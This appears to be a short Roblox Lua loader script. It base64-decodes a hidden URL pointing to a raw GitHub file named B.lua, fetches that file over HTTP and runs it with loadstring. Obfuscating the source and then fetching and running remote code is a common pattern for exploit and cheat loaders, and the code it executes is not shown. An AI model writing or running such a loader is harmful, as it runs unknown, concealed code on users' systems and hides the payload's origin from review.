local encoded_url = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1hHSVlGRy9yb2Jsb3gtc2NyaXB0cy9yZWZzL2hlYWRzL21haW4vQi5sdWE="
local real_url = game:GetService("HttpService"):Base64Decode(encoded_url)
loadstring(game:HttpGet(real_url))()
